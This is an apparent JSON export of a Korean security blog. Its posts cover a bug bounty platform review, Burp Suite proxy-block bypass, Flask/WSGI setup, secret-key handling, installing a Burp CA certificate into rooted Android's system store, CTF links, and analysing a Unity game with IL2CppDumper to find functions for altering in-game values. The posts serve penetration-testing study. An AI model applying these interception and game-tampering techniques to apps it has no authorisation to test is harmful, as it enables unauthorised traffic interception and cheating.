ㅎㅎ.. 요즘은 회사일 때문에 바빠서 블로그에 글을 잘 못쓰고 있는데 주말이라는 시간을 활용해서 새 문제들이 어떤 문제이고, 어떤 기법을 활용했는지 등을 Write up 과 함께 준비하려고 합니다! 그럼. Coming soon~","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/tags/CTF/"},{"name":"Web Hacking","slug":"Web-Hacking","permalink":"https://blog.jhyeon.dev/tags/Web-Hacking/"},{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/tags/Wargame/"},{"name":"webhacking.kr","slug":"webhacking-kr","permalink":"https://blog.jhyeon.dev/tags/webhacking-kr/"}]},{"title":"Memory Mitigation - ASLR","slug":"memory-mitigation-2","date":"2021-07-04T23:17:00.000Z","updated":"2021-07-04T23:18:36.968Z","comments":true,"path":"2021/07/05/memory-mitigation-2/","link":"","permalink":"https://blog.jhyeon.dev/2021/07/05/memory-mitigation-2/","excerpt":"","text":"Link아래 링크에 접속하시면 게시글을 보실 수 있습니다! 바로가기(Notion)","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"메모리 보호기법","slug":"메모리-보호기법","permalink":"https://blog.jhyeon.dev/tags/%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95/"},{"name":"Memory Mitigation","slug":"Memory-Mitigation","permalink":"https://blog.jhyeon.dev/tags/Memory-Mitigation/"},{"name":"ASLR","slug":"ASLR","permalink":"https://blog.jhyeon.dev/tags/ASLR/"}]},{"title":"Memory Mitigation - RELRO","slug":"memory-mitigation-1","date":"2021-07-04T00:39:00.000Z","updated":"2021-07-04T00:43:01.425Z","comments":true,"path":"2021/07/04/memory-mitigation-1/","link":"","permalink":"https://blog.jhyeon.dev/2021/07/04/memory-mitigation-1/","excerpt":"","text":"Link아래 링크에 접속하시면 게시글을 보실 수 있습니다! 바로가기(Notion)","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"메모리 보호기법","slug":"메모리-보호기법","permalink":"https://blog.jhyeon.dev/tags/%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95/"},{"name":"Memory Mitigation","slug":"Memory-Mitigation","permalink":"https://blog.jhyeon.dev/tags/Memory-Mitigation/"},{"name":"RELRO","slug":"RELRO","permalink":"https://blog.jhyeon.dev/tags/RELRO/"}]},{"title":"해킹존(HackingZone) 국내 버그바운티 플랫폼 리뷰","slug":"hackingzone-210704","date":"2021-07-04T00:34:00.000Z","updated":"2021-07-04T03:00:23.596Z","comments":true,"path":"2021/07/04/hackingzone-210704/","link":"","permalink":"https://blog.jhyeon.dev/2021/07/04/hackingzone-210704/","excerpt":"","text":"버그 바운티란?기업의 서비스나 제품 등을 해킹하여 취약점을 발견한 화이트 해커에게 포상금을 지급하는 제도. 대표적으로 넷플릭스, 구글, 애플, 스타벅스, 페이스북 등 글로벌 유명기업도 다수 진행하고 있으며 국내 기업에도 삼성, 네이버, 리디북스 등 자발적으로 버그 바운티 시장에 참여하는 기업이 증가하고 있습니다. 참여 방법국내에는 대표적으로 제보하는 사이트가 한국인터넷진흥원(KISA)와 최근에 오픈된 해킹존 플랫폼이 존재합니다. 이외에도 자사 기업 서비스 취약점을 제보하는 네이버,리디북스 등 기업에서도 자발적으로 버그바운티 제도를 시행하고 있는 추세입니다. 해킹존이란?해킹존 플랫폼도 위 설명한 플랫폼들과 같이 기업 서비스, 제품들에 대해 취약점을 제보를 받아 포상금을 지급하는 국내 버그바운티 플랫폼 입니다. 해킹존만의 차이점이라고 한다면 자사 서비스만이 아닌 국내 스타트업, 중소기업, 대기업과 협력해 다양한 기업들의 서비스, 제품들의 취약점을 찾고 이를 제보할 수 있도록 하고 있고 본인도 이런 장점이 편리해서 국내 버그바운티를 할 때는 해킹존 플랫폼을 주로 사용합니다. 해킹존에 대해서 알아보자 해킹존 홈페이지 : https://hackingzone.net 해킹존 홈페이지에 들어가면 우선 이렇게 사용자 친화적인 UI/UX 인터페이스를 뽐내고 있습니다. 전체 진행중인 버그 바운티 프로그램에 대해서 목록화가 되어있고, 오른쪽에는 리포터 랭킹이라고 취약점을 제보하여 포상금 또는 포인트를 얻은 사용자의 순위를 보여주고 있습니다. 이제 프로그램 별 버그 바운티 페이지가 어떻게 구성되어있는지 보면, 사진과 같이 프로그램 명 최대 지급 포인트 최대 포상금 제보된 취약점 진행 기간 이렇게 한눈에 알아볼 수 있도록 정보가 표시되어 있구요. 아래에는 프로그램 소개라해서 해당 서비스가 어떤 서비스인지 간단하게 소개해주고 있고 아래에는 취약점 제보 관련해서 안내 사항을 기록한 내용입니다. 글로싸인 같은 경우 빨간글씨로 취약점 제외 대상 홈페이지를 명시해두었는데 이부분을 해석하면 간혹 취약점 대상 사이트가 아닌곳을 접근하여 공격 시도를 하시는 분들이 많나봅니다 ㅎㅎ.. 그리고 마지막으로는 취약점 제보 관련해서 제약 사항들로 표시됩니다. 취약점 제보를 하되 포상이 제외되는 항목을 나열한것이고 이 항목들에 연관이 된다면 취약점이 인정이 되도 포상은 안되겠죠? ㅎㅎ 이건 조금 신선했던 기능인데 중복 취약점 제보를 막기위해서 대상 서비스에 어떤 취약점이 제보되었는지 제목, 제보시간을 공개하면서 ~~ 취약점이 있었구나하면서 중복 제보 하는것을 조금 줄일수도 있을 것이고, 어떻게 보면 조금 더 넓은 시각으로 보면서 다르게 접근해서 또 새로운 취약점을 찾아낼 수도 있는 것이지요! 아무튼 이 기능은 매우 좋은 것 같습니다. 마지막으로 소개할 기능인데 MY 리포트 라고해서 본인이 제보한 취약점 항목, 포상금 지급 내역 취약점 제보 이후 처리되고 있는 과정들을 간단하게 볼 수 있는 페이지에요~ 제보한 취약점들을 다시 볼 수 있도록 되어 있어서 나중에 찾아야 하는 일이 생기더라도 MY 리포트 페이지를 통해서라면 쉽고 빠르게 확인할 수 있습니다 ~! 마지막으로 소개할 취약점 제보 페이지입니다! 저도 여태껏 KISA쪽 버그 바운티만 했다보니 취약점을 제보할 때 직접 HWP 양식대로 보고서를 작성해야 했는데 해킹존 플랫폼은 자체적인 제보 페이지 관리 및 운영을 하고 계셔서 더욱더 쉽게 취약점을 제보할 수 있답니다~ 제목, 공격 유형, 공격 영향, 취약점 설명, 조치방안, 첨부파일 등 꽤 다양한 항목들을 입력할 수 있도록 되어있고 디테일하게 설명되어 있어서 어렵지 않게 작성할 수 있답니다. 요것은 제보 페이지 마지막 섹션에 있는 부분인데 처음 버그 바운티를 하시는 분들은 잘 모르실 수 있는 비밀 협의 조항입니다! 취약점을 제보하고나서 어떠한 경로라도 외부에 관련 내용을 유출하게 되면 정보통신망법에 의거하여 처벌을 받게됩니다. 이는 다른 버그 바운티를 진행하는 서비스에도 공통적인 항목이며 꼭 지켜주셔야 합니다! 마무리이전에도 해킹존쪽에서 연락이 오셔서 인터뷰 요청을 해주셨는데 해킹존 플랫폼분들이 다들 친절하시고 사용자 입장에서 해킹존 플랫폼 발전을 위해 여러가지 의견도 적극적으로 들어주셨습니다 ㅎㅎ. 향후 해킹존의 방향이 매우 기대가 되고 있고 널리 알려져서 국내 버그바운티 시장이 규모가 확대되었으면 좋겠습니다.","categories":[{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"}],"tags":[{"name":"KISA","slug":"KISA","permalink":"https://blog.jhyeon.dev/tags/KISA/"},{"name":"삼성SDS","slug":"삼성SDS","permalink":"https://blog.jhyeon.dev/tags/%EC%82%BC%EC%84%B1SDS/"},{"name":"버그 바운티","slug":"버그-바운티","permalink":"https://blog.jhyeon.dev/tags/%EB%B2%84%EA%B7%B8-%EB%B0%94%EC%9A%B4%ED%8B%B0/"},{"name":"Bug Bounty","slug":"Bug-Bounty","permalink":"https://blog.jhyeon.dev/tags/Bug-Bounty/"},{"name":"취약점 제보","slug":"취약점-제보","permalink":"https://blog.jhyeon.dev/tags/%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%9C%EB%B3%B4/"},{"name":"해킹존","slug":"해킹존","permalink":"https://blog.jhyeon.dev/tags/%ED%95%B4%ED%82%B9%EC%A1%B4/"}]},{"title":"Proxy Bypass Technologies","slug":"proxybypass-210525","date":"2021-05-25T15:10:00.000Z","updated":"2021-05-25T15:18:27.305Z","comments":true,"path":"2021/05/26/proxybypass-210525/","link":"","permalink":"https://blog.jhyeon.dev/2021/05/26/proxybypass-210525/","excerpt":"","text":"Intro이번 글에서는 웹 프록시 도구로 취약점을 진단할 때 이러한 프록시 설정이 차단되어 있을 경우를 가정하여 우회(Bypassing) 하는 방법을 작성해보고자 합니다. Bypass첫 번째로 Burp Suite 프록시 도구를 통해 진단을 하는 경우에는 Request Handling 기능을 사용할 수 있습니다. Proxy 기본 설정 옵션에 존재하며 해당 기능을 사용하면 예를 들어 jhyeon.com 으로 요청을 했을 때 Redirection 과정을 거쳐 타겟(대상) URL로 이동하기 때문에 프록시 차단 솔루션이 브라우저를 향해 바라보고 있다면 이러한 요청 처리(Request Handling)을 통해 프록시 차단 우회가 가능합니다. 설정 방법은 다음과 같습니다. Burp Suite - Proxy - Options - Proxy Listeners 탭에서 기존에 설정된 프록시 설정을 편집(Edit)모드로 들어가 Request Handling 설정을 하면 됩니다. 이 때 Redirect to Host 값에는 프록시을 우회하고 들어갈 타겟(대상) URL을 입력해주신 뒤 저장을 하시고, 아래 Match and Replace 옵션에서 Host Header 값을 사진과 같이 설정해주셔야 합니다. Match에는 임의로 접속할 URL주소, Replace에는 변경할 헤더 즉, 타겟(대상) URL 주소가 됩니다. Etc이외에도 크롬 확장 프로그램으로 지원하는 Proxy SwitchyOmega 툴이 있습니다. Burp Suite, Fidder 등이 패킷을 직접 캡처하고 송/수신 하는 용도라면 해당 도구는 브라우저와 프록시 서버 간 통신을 위해 사용하는 프록시 도구입니다. 다운로드 : Chrome Store 위 크롬 스토어 링크에서 다운로드 하여 확장 프로그램에 추가한 뒤 사용할 수 있습니다. 위 사진과 같이 설정을 하면 127.0.0.1:8080 로컬 서버를 프록시 서버로 경유시켜 패킷을 전송시킬 수 있습니다. 물론, Burp Suite와 설정을 맞추어 패킷을 캡처하여 전송시키는 것도 가능합니다. 아직 해당 도구에 대한 경험이 그렇게 많지는 않아서 더 좋은 사용 사례나 도구들이 있다면 추가로 포스팅 하겠습니다! References ASTX E2E Bypass","categories":[],"tags":[{"name":"모의해킹","slug":"모의해킹","permalink":"https://blog.jhyeon.dev/tags/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/"},{"name":"Burp Suite","slug":"Burp-Suite","permalink":"https://blog.jhyeon.dev/tags/Burp-Suite/"},{"name":"웹 모의해킹","slug":"웹-모의해킹","permalink":"https://blog.jhyeon.dev/tags/%EC%9B%B9-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9/"},{"name":"웹 해킹","slug":"웹-해킹","permalink":"https://blog.jhyeon.dev/tags/%EC%9B%B9-%ED%95%B4%ED%82%B9/"},{"name":"Fiddler","slug":"Fiddler","permalink":"https://blog.jhyeon.dev/tags/Fiddler/"},{"name":"Proxy","slug":"Proxy","permalink":"https://blog.jhyeon.dev/tags/Proxy/"},{"name":"Proxy Bypass","slug":"Proxy-Bypass","permalink":"https://blog.jhyeon.dev/tags/Proxy-Bypass/"}]},{"title":"Python Flask + WSGI 사용하기","slug":"flask-apache-210521","date":"2021-05-20T15:00:00.000Z","updated":"2021-05-20T16:46:30.832Z","comments":true,"path":"2021/05/21/flask-apache-210521/","link":"","permalink":"https://blog.jhyeon.dev/2021/05/21/flask-apache-210521/","excerpt":"","text":"Intro이번 글에서는 Python Flask 환경에서 WSGI를 사용해 Apache2 웹 서버 엔진과 연동하는 방법에 대해서 글을 작성해보고자 한다. WSGI란?WSGI(Web Server Gateway Interface)로 파이썬에서 웹 어플리케이션이 서버와 통신하기 위한 인터페이스를 의미한다. 즉, 웹 서버가 받은 요청을 Python Application 으로 넘겨주고 응답을 반환받는 호출 조약(Calling Converstation)이다. WSGI를 왜 사용하는가? Flask 같은 경우 Restful API 서비스에 사용되거나 하는 가장 최소한의 기능들을 포함한 웹 프레임 워크입니다. 기본적으로 한번에 최대 하나의 요청까지만을 처리하기 때문에 실제 웹 서비스를 배포하는 경우, Flask를 단일로 구성해서 배포하는 것은 올바르지 않은 것이고 주로 WSGI를 사용해서 중간에 웹 서버 엔진(nginx, apache 등)을 경유할 수 있도록 하는 것이 좋습니다. WSGI Middleware 사진으로 매우 간결하게 정리되어있는데 Private Physical Server 위에 그려진 모든 내용을 WAS(Web Application Server)라고 명칭합니다. 그리고 WSGI Module, Process를 합쳐서 WSGI Middleware 라고 부르게 되고 WSGI 전용 프로토콜을 사용합니다. 이러한 WSGI Middleware는 웹 서버(Web Server)와 어플리케이션(Application)을 서로 연결시켜주는 역할을 합니다. Installation이번 글에서는 flask+uwsgi+nginx를 사용한 웹 어플리케이션 구동 과정과, flask+wsgi+apache2를 사용한 구동 과정을 정리할 것이다. NGINX예전에는 uwsgi를 통해 직접 nginx 환경을 세팅해야 했지만 요즘에는 docker를 통해서 flask+uwsgi+nginx 패키지를 묶어둔 도커 이미지가 있기 때문에 사용이 조금 더 편리해진 감이 있다. (https://hub.docker.com/r/tiangolo/uwsgi-nginx-flask) 우선 파일 트리는 다음 사진과 같다. 프로젝트 폴더(NGINX)에 dockerfile, docker-compose.yml 파일을 두고 web 폴더를 하나 생성해서 실제 flask 앱을 구동할 파일들을 넣어줬다. dockerfile FROM tiangolo/uwsgi-nginx-flask:python3.8 COPY ./web /app docker-compose.yml version: &#39;3.7&#39; services: nginx-wsgi: build: ./ container_name: nginx-wsgi ports: - 80:80 main.py from flask import Flask app = Flask(__name__) @app.route(&#39;/&#39;, methods=[&quot;GET&quot;]) def index(): return &#39;hello world!&#39; if __name__ == &quot;__main__&quot;: app.run(host=&#39;0.0.0.0&#39;, port=80, debug=False) 이렇게 구성해주고 아래 명령어로 도커 이미지를 빌드시키면 된다. docker-compose up -d --build Apache2 Apache2도 그렇게 복잡하진 않다. 환경에 맞게 wsgi 설정을 해주면 된다. 프로젝트 폴더(APACHE2)에 dockerfile, docker-compose.yml, apache2.conf, requirements.txt, run.wsgi 파일을 두고, web 폴더를 하나 생성해서 실제 flask 앱을 구동할 파일들을 넣어줬다. dockerfile FROM ubuntu:latest MAINTAINER jhyeon &lt;stjhyeon@kakao.com&gt; ENV DEBIAN_FRONTEND=noninteractive RUN apt-get update &amp;&amp; apt-get install -y apache2 \\ libapache2-mod-wsgi-py3 \\ build-essential \\ python3 \\ python3-dev \\ python3-pip \\ &amp;&amp; apt-get clean -y \\ &amp;&amp; apt-get autoremove -y \\ &amp;&amp; rm -rf /var/lib/apt/lists/* WORKDIR /var/www/app COPY ./requirements.txt /var/www/app/ RUN pip install --no-cache-dir -r requirements.txt COPY ./apache2.conf /etc/apache2/sites-available/apache2.conf COPY ./run.wsgi /var/www/app/ COPY ./web/serve.py /var/www/app/serve.py RUN a2dissite 000-default.conf RUN a2ensite apache2.conf EXPOSE 80 CMD [&quot;/usr/sbin/apache2ctl&quot;, &quot;-D&quot;, &quot;FOREGROUND&quot;] docker-compose.yml version: &#39;3.7&#39; services: apache2-wsgi: build: ./ container_name: apache2-wsgi working_dir: /var/www/app ports: - 80:80 apache2.conf &lt;VirtualHost *:80&gt; WSGIDaemonProcess app user=www-data group=www-data processes=10 threads=5 WSGIProcessGroup app WSGIScriptAlias / /var/www/app/run.wsgi &lt;Directory /var/www/app&gt; WSGIProcessGroup app WSGIApplicationGroup %&#123;GLOBAL&#125; Order deny,allow Allow from all &lt;/Directory&gt; # static linked Alias /static /var/www/app/static &lt;Directory /var/www/app/static/&gt; Order allow,deny Allow from all &lt;/Directory&gt; ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined &lt;/VirtualHost&gt; requirements.txt Flask run.wsgi #! /usr/bin/python3 import sys sys.path.insert(0, &#39;/var/www/app&#39;) from serve import app as application Download(Git)위에서 작업한 내용들은 모두 아래 깃허브에 저장되어 있으니 직접 보고 구성하셔도 됩니다. https://github.com/jhye0n/python-wsgi References 1. WSGI란?","categories":[{"name":"Development","slug":"Development","permalink":"https://blog.jhyeon.dev/categories/Development/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://blog.jhyeon.dev/tags/Flask/"},{"name":"Apache2","slug":"Apache2","permalink":"https://blog.jhyeon.dev/tags/Apache2/"},{"name":"WSGI","slug":"WSGI","permalink":"https://blog.jhyeon.dev/tags/WSGI/"},{"name":"uWSGI","slug":"uWSGI","permalink":"https://blog.jhyeon.dev/tags/uWSGI/"}]},{"title":"주요통신기반시설 기술 취약점 분석 가이드(2021-03)","slug":"kisareport-210519","date":"2021-05-19T02:00:00.000Z","updated":"2021-05-19T02:58:56.402Z","comments":true,"path":"2021/05/19/kisareport-210519/","link":"","permalink":"https://blog.jhyeon.dev/2021/05/19/kisareport-210519/","excerpt":"","text":"Intro2021.3월에 업데이트 된 KISA 주통기 기반 기술 취약점 분석 가이드 자료를 공유합니다. 모의 해킹이나 취약점 점검할 때 도움이 되는 자료입니다 ~~ 공식 홈페이지 다운로드","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"KISA","slug":"KISA","permalink":"https://blog.jhyeon.dev/tags/KISA/"},{"name":"한국인터넷진흥원","slug":"한국인터넷진흥원","permalink":"https://blog.jhyeon.dev/tags/%ED%95%9C%EA%B5%AD%EC%9D%B8%ED%84%B0%EB%84%B7%EC%A7%84%ED%9D%A5%EC%9B%90/"},{"name":"기술 취약점 분석","slug":"기술-취약점-분석","permalink":"https://blog.jhyeon.dev/tags/%EA%B8%B0%EC%88%A0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D/"},{"name":"기술 취약점 분석 가이드","slug":"기술-취약점-분석-가이드","permalink":"https://blog.jhyeon.dev/tags/%EA%B8%B0%EC%88%A0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EA%B0%80%EC%9D%B4%EB%93%9C/"},{"name":"주통기 취약점 가이드","slug":"주통기-취약점-가이드","permalink":"https://blog.jhyeon.dev/tags/%EC%A3%BC%ED%86%B5%EA%B8%B0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%80%EC%9D%B4%EB%93%9C/"}]},{"title":"dCTF 2021 Write up","slug":"dctf2021-210517","date":"2021-05-17T14:00:00.000Z","updated":"2021-05-17T14:15:26.439Z","comments":true,"path":"2021/05/17/dctf2021-210517/","link":"","permalink":"https://blog.jhyeon.dev/2021/05/17/dctf2021-210517/","excerpt":"","text":"IntrodCTF 2021 (5/15 Sat 00:00 ~ 5/17 Mon 06:59 KST) http://dctf.dragonsec.si/ pwnhub (jhyeon, malhyuk, nga) rank : 292th (1250 points) Reference해당 게시글은 아래 노션 링크를 통해 확인하실 수 있습니다. https://public.jhyeon.dev/ctf/dctf2021","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"CTFtime","slug":"CTFtime","permalink":"https://blog.jhyeon.dev/tags/CTFtime/"},{"name":"dCTF 2021","slug":"dCTF-2021","permalink":"https://blog.jhyeon.dev/tags/dCTF-2021/"}]},{"title":"Python 비밀키 관리방법(python-decouple)","slug":"python-decouple-210505","date":"2021-05-05T01:00:00.000Z","updated":"2021-05-18T10:55:43.473Z","comments":true,"path":"2021/05/05/python-decouple-210505/","link":"","permalink":"https://blog.jhyeon.dev/2021/05/05/python-decouple-210505/","excerpt":"","text":"Intro요즘 Python Web Framework(Flask, Django) 실제 웹을 운영할 때도 생각보다 괜찮게 잘 되있어서 실 서비스에도 많이 사용하게 되는 것을 여기저기서 많이 봤다. 다만 개발할 떄 비밀키라던가 API KEY 등을 코드에 하드코딩을 하면 취약점이 발생했을 때 이러한 키들이 유출 당할 수 있는 문제점이 있는데 그러한 문제를 막고자 파이썬에서는 decouple 모듈이 있다. Installpip3 install python-decouple Applysettings.ini [settings] TESTKEY=this_is_test_key main.py #!/usr/bin/python3 from decouple import config test_api_key = config(&quot;TESTKEY&quot;) print(test_api_key) 여기서 주의할 점은 settings.ini는 main.py 위치에 존재해야 하며, git으로 관리시에는 반드시 .gitignore 를 통해서 git에 push 되지 않도록 해야한다. References https://pypi.org/project/python-decouple/","categories":[{"name":"Development","slug":"Development","permalink":"https://blog.jhyeon.dev/categories/Development/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.jhyeon.dev/tags/Python/"},{"name":"Decouple","slug":"Decouple","permalink":"https://blog.jhyeon.dev/tags/Decouple/"},{"name":"SECRET_KEY","slug":"SECRET-KEY","permalink":"https://blog.jhyeon.dev/tags/SECRET-KEY/"}]},{"title":"Android 7.0 이상의 환경에서 CA 인증서 설치","slug":"android-cert-210503","date":"2021-05-02T15:00:00.000Z","updated":"2021-05-03T11:15:01.648Z","comments":true,"path":"2021/05/03/android-cert-210503/","link":"","permalink":"https://blog.jhyeon.dev/2021/05/03/android-cert-210503/","excerpt":"","text":"Intro안드로이드 빌드 7.0 이상에서 CA(Certificate Authority) 인증서를 설치 할 때, 사용자 인증서로 설치하게 되면 SSL이 정상적으로 적용되지 않는 문제가 있다. Burp Suite의 CA 인증서는 만료기간이 20년 이상의 인증서로 생성되는데, Google에서 시스템 인증서는 39개월 이내의 만료기간을 가지기 때문에 정상적으로 동작하지 않는다. 따라서 7.0 빌드 이상의 환경이라면 시스템 루트 공간에 자격 증명을 만들어줘야 동작하게 되는데 그 과정을 정리하고자 한다. Download인증서는 “Burp Suite”의 cacert.der을 사용할 것이다. http://burp Hash Extraction위 인증서를 다운로드 받았다면 인증서 변환, 해쉬 값 추출을 진행해야 한다. OpenSSL을 사용하여 이 과정 진행이 가능하다. mv cacert.der cacert.cer openssl x509 -inform DER -in cacert.cer -out cacert.pem openssl x509 -inform PEM -subject_hash_old -in cacert.pem 위 세가지 명령어를 입력했다면, 아래와 같은 사진을 확인할 수 있다. 여기서 9a5ba575(hash는 다를 수 있음)를 복사해서 파일명을 해쉬값.0 으로 바꿔준다. mv cacert.pem 9a5ba575.0 Install이제 해당 인증서를 시스템 CA 인증서 디렉토리에 push 해주면 된다. adb push 9a5ba575.0 /sdcard adb shell su mount -o rw,remount /system mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/ cd /system/etc/security/cacerts/ chmod 644 9a5ba575.0 References https://hackcatml.tistory.com/37","categories":[{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/categories/Mobile/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://blog.jhyeon.dev/tags/Android/"},{"name":"ADB","slug":"ADB","permalink":"https://blog.jhyeon.dev/tags/ADB/"},{"name":"SSL","slug":"SSL","permalink":"https://blog.jhyeon.dev/tags/SSL/"},{"name":"CA 인증서","slug":"CA-인증서","permalink":"https://blog.jhyeon.dev/tags/CA-%EC%9D%B8%EC%A6%9D%EC%84%9C/"}]},{"title":"HSPACE (SatunX) CTF 2021 Write Up","slug":"hspacectf-210425","date":"2021-04-25T03:00:00.000Z","updated":"2021-04-27T02:02:38.919Z","comments":true,"path":"2021/04/25/hspacectf-210425/","link":"","permalink":"https://blog.jhyeon.dev/2021/04/25/hspacectf-210425/","excerpt":"","text":"Intro HSPACE(SatunX) 2021 (4/24 Sat 10:00 ~ 4/24 Sat 22:00 KST) https://ctf.hspace.io/ rank : 24th (jhye3n) Write Up https://public.jhyeon.dev/ctf/hspace2021","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"Reversing","slug":"Reversing","permalink":"https://blog.jhyeon.dev/tags/Reversing/"},{"name":"Crypto","slug":"Crypto","permalink":"https://blog.jhyeon.dev/tags/Crypto/"},{"name":"Network","slug":"Network","permalink":"https://blog.jhyeon.dev/tags/Network/"},{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/tags/Mobile/"},{"name":"SatunX","slug":"SatunX","permalink":"https://blog.jhyeon.dev/tags/SatunX/"},{"name":"HSPACE","slug":"HSPACE","permalink":"https://blog.jhyeon.dev/tags/HSPACE/"},{"name":"HSPACE CTF","slug":"HSPACE-CTF","permalink":"https://blog.jhyeon.dev/tags/HSPACE-CTF/"}]},{"title":"모바일 게임 앱 분석(Unity Game Engine)","slug":"unityapp-analysis-210425","date":"2021-04-25T01:00:00.000Z","updated":"2021-04-25T02:37:15.922Z","comments":true,"path":"2021/04/25/unityapp-analysis-210425/","link":"","permalink":"https://blog.jhyeon.dev/2021/04/25/unityapp-analysis-210425/","excerpt":"","text":"Intro분석에 앞서 해당 게시글은 공부용 목적으로 연구된 자료이니, 악용 목적으로는 사용을 금합니다. Unity란?Unity는 게임 개발을 위한 엔진이며 2D 및 3D 게임을 만들 수 있고, 3D Animation(3D 애니메이션), VR(가상 현실), AR(증강 현실) 콘텐츠을 제작하는 용도로 사용됩니다. https://unity.com/kr CompilerUnity 엔진에는 크게 두 가지 컴파일 방식이 존재합니다. MONO Compile MONO 컴파일러의 경우 안드로이드의 JIT 컴파일 방식이라고 생각하시면 됩니다. JIT 컴파일러는 IL(중간언어)로 작성된 DLL 파일을 읽어, Runtime으로 코드 실행을 합니다. 빠른 빌드속도와 .NET 프레임워크를 사용하기 때문에 크로스 플랫폼(Window, Linux, MacOS)에서 구동이 가능하지만, 보안에는 매우 취약합니다. 아래 MONO 컴파일러의 빌드 방식을 확인해봅시다. 이렇게 일반적으로 컴파일 된 MONO 기반의 게임은 앱을 빌드하는 과정에서 만들어지는 DLL 파일을 통해서 쉽게 디컴파일이 가능하고 원본에 가까운 소스코드를 확인할 수 있게 됩니다. IL2CPP Compile IL2CPP 방식으로 컴파일 된 경우에는 약간 다른 구조를 띄고 있습니다. 아래 사진을 보면서 함께 설명을 하도록 하겠습니다. 이렇게 보면 위에서 본 사진이랑 확연히 구분하실 수 있을겁니다. 사진의 컴파일 과정을 보면, IL2CPP 방식에는 IL Assembly 코드를 il2cpp.exe 에 의해서 C++ 소스코드로 변환하게 되고 이를 C++ 컴파일러에 전달하여 Native Library를 생성하는 구조입니다. 즉 JAVA에서 AOT 컴파일 방식을 의미하고 있는 것이죠. 이러한 과정으로 빌드된 APK를 내부를 분석하면 lib->&#123;device-architecture&#125; 경로에 3개의 Native Library가 존재함을 알 수 있습니다. 이 라이브러리는 우선 앱이 실행될 때 libunity.so 를 로드하여 초기 설정값들을 얻어오고, 마지막에 libil2cpp.so 파일을 로드하여 앱에 정의된 메소드들을 사용하게 됩니다. Analysis전반적인 과정을 살펴봤으니, 실제 Unity로 개발 된 앱을 가지고 분석을 해보겠습니다. 앱에 대한 정보는 문제의 여지가 있어 공개되지 않습니다 (^_^) 어플리케이션 압축 해제 후 내부 구성 파일 확인 native library 확인 (unity) IL2CPPDUMPER 도구를 활용하여 앱 내부 파일 덤프 Assembly-CSharp.dll 로드 실제 게임 구동을 위해 구현된 Method들을 확인할 수 있습니다. 특정 메소드 RVA, Offset 확인 주어진 RVA, Offset 값을 통해, 모듈 Base 주소를 구해서 Offset 연산을 해주면, 해당 함수의 주소를 찾을 수 있어, 실제 게임 내 값을 변조하거나 하는 등의 방법도 가능하게 됩니다. 이렇게 단계별로 나눠 분석 도구를 활용해 간단하게만 분석을 해봤는데, 이후 실제 앱을 기반으로 게임 내 값을 변조한다거나 하는 방법은 정리 및 검토가 끝난 후 추가로 포스팅 하겠습니다_ Tools https://github.com/icsharpcode/ILSpy (ILSPY) https://github.com/0xd4d/dnSpy (dnSpy) https://github.com/Perfare/Il2CppDumper (IL2CppDumper) Reference LINFORUM (http://linforum.kr/)","categories":[{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/categories/Mobile/"}],"tags":[{"name":"Penetration","slug":"Penetration","permalink":"https://blog.jhyeon.dev/tags/Penetration/"},{"name":"Mobile","slug":"Mobile","permalink":"https://blog.jhyeon.dev/tags/Mobile/"},{"name":"App","slug":"App","permalink":"https://blog.jhyeon.dev/tags/App/"},{"name":"Unity","slug":"Unity","permalink":"https://blog.jhyeon.dev/tags/Unity/"},{"name":"Mobile Hacking","slug":"Mobile-Hacking","permalink":"https://blog.jhyeon.dev/tags/Mobile-Hacking/"}]},{"title":"Unity 엔진으로 개발 된 앱 덤프 도구","slug":"il2cppdumper-210425","date":"2021-04-24T15:00:00.000Z","updated":"2021-04-24T17:27:43.160Z","comments":true,"path":"2021/04/25/il2cppdumper-210425/","link":"","permalink":"https://blog.jhyeon.dev/2021/04/25/il2cppdumper-210425/","excerpt":"","text":"Intro il2cppDumper https://github.com/Perfare/Il2CppDumper il2cppdumper.exe &lt;executable-file&gt; &lt;metadata.dat&gt; 